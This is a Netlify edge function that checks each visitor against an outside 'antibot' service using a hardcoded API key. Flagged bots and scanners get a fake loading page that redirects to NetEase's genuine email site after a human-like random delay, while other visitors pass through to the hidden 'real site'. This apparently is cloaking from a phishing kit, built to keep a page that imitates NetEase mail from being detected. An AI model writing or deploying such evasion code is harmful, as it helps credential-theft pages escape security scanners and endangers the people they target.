import { Context } from "https://edge.netlify.com";

export default async (request: Request, context: Context) => {
  const apiKey = "5a9f4ae09c4daabb43a8c8e126e7591e";
  const botUrl = "https://email.163.com/"; // NetEase
  
  // 1. Get User Info
  const ip = context.ip;
  const ua = request.headers.get("user-agent") || "";
  
  try {
    // 2. Call Antibot API
    const apiCheck = await fetch(`https://xantibot.net/api/ip-antibot?apikey=${apiKey}&ip=${ip}&useragent=${encodeURIComponent(ua)}`);
    const result = await apiCheck.json();

    // 3. If it's a Bot, perform a "Human-Style" Redirect
    if (result?.data?.is_blocked === 1) {
      
      // We return a fake loading page instead of a 302 header
      return new Response(`
        <html>
          <head>
            <title>Loading...</title>
            <style>
              body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
              .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
              @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
          </head>
          <body>
            <div class="loader"></div>
            <script>
              // Random delay between 2 and 5 seconds to mimic human wait time
              const delay = Math.floor(Math.random() * (5000 - 2000 + 1) + 2000);
              setTimeout(() => {
                window.location.href = "${botUrl}";
              }, delay);
            </script>
          </body>
        </html>
      `, {
        headers: { "content-type": "text/html" },
      });
    }

    // 4. If Human, continue to the real site
    return context.next();

  } catch (e) {
    return context.next(); // Fail-safe: let them through if API errors
  }
};